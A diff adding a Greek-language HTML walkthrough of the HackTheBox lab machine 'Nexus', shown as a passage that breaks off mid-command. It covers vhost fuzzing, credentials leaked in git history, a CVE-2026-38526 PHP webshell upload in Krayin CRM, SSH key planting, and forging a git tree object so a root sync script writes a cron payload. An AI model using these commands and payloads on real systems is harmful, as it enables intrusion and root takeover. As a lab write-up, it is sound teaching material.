@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Nexus — S. Markakis</title>
+<meta name="description" content="HackTheBox Nexus — η πρώτη commit ενός διαρρεύσαντος repo Gitea εκθέτει ένα επαναχρησιμοποιημένο password μέσα στο Krayin CRM, το CVE-2026-38526 μετατρέπει ένα authenticated upload TinyMCE σε RCE σαν www-data, ένα δεύτερο .env παραδίδει SSH σαν jones, και ένα script template-sync που τρέχει σαν root και γράφει git blobs με βάση το tree-entry path τους γίνεται αντικείμενο κατάχρησης με ένα χειροποίητο tree object απόλυτου-path για να φυτέψει ένα cronjob root — ολόκληρη η αλυσίδα οδηγημένη από macOS.">
+<meta property="og:title" content="HTB: Nexus — S. Markakis">
+<meta property="og:description" content="HackTheBox Nexus — διαρροή commit Gitea → RCE upload CVE-2026-38526 στο Krayin CRM → SSH σαν jones → ένα script template-sync root γράφει αρχεία με βάση το tree-entry path τους στο git, οπότε ένα χειροποίητο tree object απόλυτου-path φυτεύει ένα cronjob root. Οδηγημένο από macOS.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-nexus-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-nexus.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-nexus.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-nexus-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-nexus.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-nexus-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-nexus.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Nexus",
+  "description": "HackTheBox Nexus — η πρώτη commit ενός διαρρεύσαντος repo Gitea εκθέτει ένα επαναχρησιμοποιημένο password μέσα στο Krayin CRM, το CVE-2026-38526 μετατρέπει ένα authenticated upload TinyMCE σε RCE σαν www-data, ένα δεύτερο .env παραδίδει SSH σαν jones, και ένα script template-sync που τρέχει σαν root και γράφει git blobs με βάση το tree-entry path τους γίνεται αντικείμενο κατάχρησης με ένα χειροποίητο tree object απόλυτου-path για να φυτέψει ένα cronjob root — ολόκληρη η αλυσίδα οδηγημένη από macOS.",
+  "datePublished": "2026-08-04",
+  "dateModified": "2026-08-04",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-nexus-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-nexus.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-nexus"
+  },
+  "timeRequired": "PT10M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-nexus.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Nexus</h1>
+    <div class="post-meta">
+      <span class="date">12 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Git internals</span>
+      <span>&nbsp;10 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το Nexus είναι μια αλυσίδα μικρών διαρροών που αθροίζονται. Μια σάρωση vhost αναδεικνύει ένα instance <strong>Gitea</strong> και ένα billing portal <strong>Krayin CRM</strong>. Το Gitea φιλοξενεί ένα repo <code>krayin-docker-setup</code> του οποίου η <em>πρώτη</em> commit ακόμα περιέχει ένα password στο <code>.env</code> — επαναχρησιμοποιημένο για τον admin CRM. Το Krayin 2.2.0 είναι ευάλωτο στο <strong>CVE-2026-38526</strong>, ένα authenticated upload TinyMCE χωρίς έλεγχο τύπου, οπότε ένα webshell PHP προσγειώνεται σε έναν φάκελο web-served και δίνει <code>www-data</code>. Ένα δεύτερο <code>.env</code> στον δίσκο αποδίδει ακόμα ένα επαναχρησιμοποιημένο password — SSH σαν <code>jones</code>. Το βήμα root είναι το ενδιαφέρον: ένα script "template sync" που τρέχει σαν root τραβάει αρχεία από template repos Gitea και γράφει κάθε blob στο <code>os.path.join(staging, filepath)</code>, όπου το <code>filepath</code> είναι το <em>όνομα tree entry</em> του git. Το Git κανονικά αρνείται paths <code>../</code> και με αρχικό slash — αλλά μπορείς να πλαστογραφήσεις με το χέρι ένα tree object του οποίου το όνομα entry είναι ένα <strong>απόλυτο path</strong>, και το <code>os.path.join</code> πετάει το prefix staging τη στιγμή που βλέπει ένα αρχικό <code>/</code>. Αυτό είναι ένα αυθαίρετο root file-write, που γίνεται ένα cronjob και ένα shell root. Όλα οδηγημένα από macOS.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">vhost fuzz</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">Gitea .env leak</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">Krayin CVE-2026-38526</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">www-data</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">.env → SSH jones</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">git tree-path write → root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <p>Δύο θύρες, και το web root ανακατευθύνει σε ένα hostname — μια ένδειξη να ξεκινήσεις κάνοντας fuzz vhosts, όχι paths.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -Pn -sV -p- --min-rate 2000 &lt;IP&gt;</span>
+<span class="po">22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+80/tcp open  http  nginx 1.24.0 (Ubuntu)   </span><span class="pco"># redirects to http://nexus.htb/</span></div>
+  </div>
+
+  <p>Το κύριο site είναι στατικό — το μόνο αξιοσημείωτο είναι ένα email, <code>j.matthew@nexus.htb</code>, σε ένα τμήμα careers. Το brute-forcing φακέλων δεν βρίσκει τίποτα, οπότε κάνε pivot σε ανακάλυψη <strong>virtual-host</strong> με ffuf, φιλτράροντας το default μέγεθος απάντησης:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ffuf — vhost fuzzing</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" \
+     -w dns-Jhaddix.txt -fs 154</span>
+<span class="pg">billing  [Status: 302, Size: 390]
+git      [Status: 200, Size: 14472]</span></div>
+  </div>
+
+  <p>Πρόσθεσε <code>nexus.htb</code>, <code>billing.nexus.htb</code> και <code>git.nexus.htb</code> στο <code>/etc/hosts</code> (ή οδήγησε τα πάντα με <code>curl -H "Host: …"</code>, που είναι αυτό που έκανα για να κρατήσω τα πράγματα scriptable).</p>
+
+  <!-- ══ GITEA ══ -->
+  <h2>Gitea — ένα password στην πρώτη commit</h2>
+
+  <p>Το <code>git.nexus.htb</code> είναι ένα instance Gitea με ένα δημόσιο repo, το <code>admin/krayin-docker-setup</code>. Το API του Gitea κάνει το περπάτημα στο commit history τετριμμένο χωρίς browser:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">enumerate repo + commits (API)</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -H "Host: git.nexus.htb" \
+     "http://&lt;IP&gt;/api/v1/repos/admin/krayin-docker-setup/commits" | jq -r '.[].sha'</span>
+<span class="po">9b817fa4…   </span><span class="pco"># latest</span><span class="po">
+1615c465…   </span><span class="pco"># initial</span></div>
+  </div>
+
+  <p>Το <code>.env</code> στο HEAD έχει ένα άδειο <code>DB_PASSWORD</code> — αλλά secrets που έχουν γίνει commit μία φορά δεν εξαφανίζονται όταν επεξεργάζεσαι το αρχείο, απλά μετακινούνται κάτω στο history. Το να τραβήξεις το <code>.env</code> στην <em>αρχική</em> commit λέει μια διαφορετική ιστορία:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">.env at the first commit</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -H "Host: git.nexus.htb" \
+     "http://&lt;IP&gt;/admin/krayin-docker-setup/raw/commit/1615c465…/.env" | grep -i pass</span>
+<span class="pg">DB_PASSWORD=N27xh!!2ucY04</span></div>
+  </div>
+
+  <!-- ══ KRAYIN ══ -->
+  <h2>Krayin CRM — CVE-2026-38526 → www-data</h2>
+
+  <p>Το <code>billing.nexus.htb</code> είναι ένα login admin <strong>Krayin CRM</strong>. Το email από τη σελίδα careers συν το διαρρεύσαν password μας βάζουν μέσα — το login του Laravel χρειάζεται απλά ένα έγκυρο <code>_token</code> τραβηγμένο πρώτα από τη φόρμα login:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">authenticate to Krayin</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -c cj -H "Host: billing.nexus.htb" http://&lt;IP&gt;/admin/login  </span><span class="pco"># grab _token + cookie</span>
+<span class="pd">$ </span><span class="pc">curl -s -b cj -c cj -H "Host: billing.nexus.htb" -D - -o /dev/null \
+     --data-urlencode "_token=$TOKEN" \
+     --data-urlencode "email=j.matthew@nexus.htb" \
+     --data-urlencode "password=N27xh!!2ucY04" http://&lt;IP&gt;/admin/login</span>
+<span class="pg">HTTP/1.1 302 Found
+Location: http://billing.nexus.htb/admin/dashboard</span></div>
+  </div>
+
+  <p>Η έκδοση (2.2.0, φαίνεται κάτω από το μενού profile) είναι ευάλωτη στο <strong>CVE-2026-38526</strong> — το endpoint <code>/admin/tinymce/upload</code> δεν κάνει καμία server-side validation τύπου ή επέκτασης, και γράφει μέσα στο web-served <code>/storage/tinymce/</code>. Οπότε ένας authenticated χρήστης μπορεί να ανεβάσει ένα αρχείο <code>.php</code> (κάνοντας spoof ένα MIME εικόνας για να φαίνεται φυσιολογικό) και μετά να το εκτελέσει με ένα απλό GET. Αντί για το reverse shell του δημόσιου PoC, ανέβασα ένα μικρό scriptable webshell — κανένα listener να προσέχω:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">upload webshell → RCE</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">printf '&lt;?php system($_GET["c"]); ?&gt;' &gt; sh.php</span>
+<span class="pd">$ </span><span class="pc">curl -s -b cj -H "Host: billing.nexus.htb" -H "X-CSRF-TOKEN: $TOKEN" \
+     -F "_token=$TOKEN" -F "file=@sh.php;filename=sh.php;type=image/png" \
+     http://&lt;IP&gt;/admin/tinymce/upload</span>
+<span class="pg">{"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/1b9c0b4a….php"}</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Host: billing.nexus.htb" "http://&lt;IP&gt;/storage/tinymce/1b9c0b4a….php?c=id"</span>
+<span class="pg">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+  </div>
+
+  <!-- ══ USER ══ -->
+  <h2>Πλάγιο — ένα δεύτερο .env → SSH σαν jones</h2>
+
+  <p>Το <code>/etc/passwd</code> δείχνει έναν πραγματικό χρήστη, τον <code>jones</code>, του οποίου το home δεν μπορούμε να διαβάσουμε σαν <code>www-data</code>. Αλλά η deployed εφαρμογή κουβαλά το δικό της ζωντανό <code>.env</code>, και κρατά ένα <em>διαφορετικό</em> password από αυτό στο git:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">read the on-disk .env</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -H "Host: billing.nexus.htb" \
+     "http://&lt;IP&gt;/storage/tinymce/1b9c0b4a….php?c=grep+PASS+/var/www/krayin/.env"</span>
+<span class="pg">DB_PASSWORD=y27xb3ha!!74GbR</span></div>
+  </div>
+
+  <p>Η επαναχρησιμοποίηση password κάνει τα υπόλοιπα — εκείνη η τιμή είναι το password SSH του <code>jones</code>. Πρώτο πράγμα μόλις μπεις, φύτεψε ένα κλειδί SSH ώστε το foothold να είναι ένα σταθερό <code>ssh -i</code> αντί για ένα εύθραυστο session:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">SSH + user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sshpass -p 'y27xb3ha!!74GbR' ssh jones@&lt;IP&gt; \
+     "mkdir -p ~/.ssh; echo '$(cat key.pub)' &gt;&gt; ~/.ssh/authorized_keys"</span>
+<span class="pd">$ </span><span class="pc">ssh -i key jones@&lt;IP&gt; 'id; cat ~/user.txt'</span>
+<span class="po">uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)</span>
+<span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Root — κατάχρηση paths git tree-entry σε ένα script sync root</h2>
+
+  <p>Χωρίς sudo για τον <code>jones</code>. Το στοιχείο είναι στο <code>/etc/systemd/system</code>: ένα timer πυροδοτεί ένα oneshot <strong>root</strong> κάθε λεπτό.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">the root timer</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">cat /etc/systemd/system/gitea-template-sync.service</span>
+<span class="po">[Service]
+Type=oneshot
+</span><span class="py">User=root</span><span class="po">
+ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py    </span><span class="pco"># + a .timer, every 1 min</span></div>
+  </div>
+
+  <p>Το script (world-readable) κάνει query το Gitea για κάθε repo σημασμένο σαν <em>template</em>, μετά για το καθένα τρέχει <code>git ls-tree -r HEAD</code> πάνω στο bare repo και αντιγράφει κάθε blob σε έναν φάκελο staging. Ορίστε όλη η ευπάθεια, σε τρεις γραμμές:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">template-sync.py (excerpt)</span>
+    </div>
+    <div class="term-body"><span class="po">stage_path = os.path.join(STAGING_DIR, owner, name)
+...
+for mode, objhash, filepath in entries:          </span><span class="pco"># filepath = git tree-entry name</span><span class="po">
+    target = </span><span class="py">os.path.join(stage_path, filepath)</span><span class="po">
+    ...
+    with open(target, 'wb') as f:                </span><span class="pco"># written as ROOT</span><span class="po">
+        f.write(cat_result.stdout)</span></div>
+  </div>
+
+  <p>Το <code>filepath</code> ελέγχεται από τον επιτιθέμενο — είναι όποιο όνομα κουβαλά ένα tree entry — και ρέει κατευθείαν μέσα στο <code>os.path.join</code>. Η ιδιαιτερότητα που το κάνει μοιραίο:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">os.path.join and a leading slash</span>
+    </div>
+    <div class="term-body"><span class="pd">&gt;&gt;&gt; </span><span class="pc">os.path.join('/home/git/staging/jones/pwn', 'a/b.txt')</span>
+<span class="po">'/home/git/staging/jones/pwn/a/b.txt'</span>
+<span class="pd">&gt;&gt;&gt; </span><span class="pc">os.path.join('/home/git/staging/jones/pwn', '/etc/cron.d/pwncron')</span>
+<span class="pg">'/etc/cron.d/pwncron'      </span><span class="pco"># absolute component discards the prefix</span></div>
+  </div>
+
+  <p>Οπότε αν μπορέσω να αποκτήσω ένα tree entry του οποίου το όνομα είναι <code>/etc/cron.d/pwncron</code>, η διαδικασία root γράφει το αρχείο μου κατευθείαν στο <code>/etc/cron.d</code>. Το εμπόδιο είναι ότι το plumbing του Git (και οι έλεγχοι push του Gitea) απορρίπτουν κανονικά paths <code>../</code> και με αρχικό slash. Ο τρόπος να περάσεις είναι να <strong>πλαστογραφήσεις τα αντικείμενα git με το χέρι</strong> — χτίσε ένα ωμό tree object του οποίου το όνομα entry είναι το απόλυτο path, χρησιμοποιώντας <code>hash-object --literally</code>, που παρακάμπτει τους ελέγχους λογικής:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">forge the malicious tree + commit</span>
+    </div>
+    <div class="term-body"><span class="pco"># payload the root cron will run: SUID-copy bash</span>
+<span class="pd">$ </span><span class="pc">printf '* * * * * root /tmp/.copybash.sh\n' &gt; cronfile</span>
+<span class="pd">$ </span><span class="pc">BLOB=$(git hash-object -w --stdin &lt; cronfile)</span>
+
+<span class="pco"># a tree entry: mode 100644, NAME = an absolute path, pointing at that blob</span>
+<span class="pd">$ </span><span class="pc">PH=$(echo -n "$BLOB" | xxd -r -p)                       </span><span class="pco"># 20 raw bytes of the hash</span>
